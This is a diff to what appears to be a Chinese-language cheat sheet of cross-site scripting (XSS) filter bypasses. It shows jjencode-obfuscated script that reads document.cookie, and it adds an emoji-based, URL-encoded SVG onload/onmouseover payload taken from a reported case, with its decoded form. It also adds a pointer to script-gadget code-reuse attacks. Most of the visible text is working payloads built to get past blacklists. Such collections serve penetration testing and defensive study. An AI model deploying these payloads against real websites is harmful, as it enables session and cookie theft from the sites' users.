@@ -401,7 +401,7 @@ html实体编码 十进制 (不带分号 chrome下可行)
 (alert)(document.cookie)
 ((alert))((document.cookie))
 ```
-- 绕过某些黑名单规则 使用[jjencode](http://utf-8.jp/public/jjencode.html) 或 [aaencode](http://utf-8.jp/public/aaencode.html) 注:编码后的内容可放在"事件处理属性"中 如`onerror=`
+- 绕过某些黑名单规则 使用[jjencode](http://utf-8.jp/public/jjencode.html) 或 [aaencode](http://utf-8.jp/public/aaencode.html)编码. 注:编码后的内容可放在"事件处理属性"中 如`onerror=`
 ```
 <script>
 // 语句 alert(document.cookie); 的 jjencode 形式:
@@ -412,7 +412,22 @@ $=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[
 </script>
 ```
 
-通过"代码重用"(code-reuse) 实现XSS
+- 绕过某些黑名单规则 使用emoji字符. 查询各种字符的各种编码 https://graphemica.com/%F0%9F%98%82
+```
+emoji字符  经过URL编码的值
+ 😂         %F0%9F%98%82
+
+
+比如实际案例 #853637
+
+Payload with an emoji :
+%F0%9F%98%82<%3CsVg/onload%F0%9F%98%82=/svg/onload%3Dsvg/onmouseOver=confirm`1`><!--%F0%9F%98%82//=
+
+Decoded Payload:
+😂<<sVg/onload😂=/svg/onload=svg/onmouseOver=confirm`1`><!--😂//=
+```
+
+- 通过"代码重用"(code-reuse) 实现XSS
 
 参考[Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets](https://acmccs.github.io/papers/p1709-lekiesA.pdf)
 ```
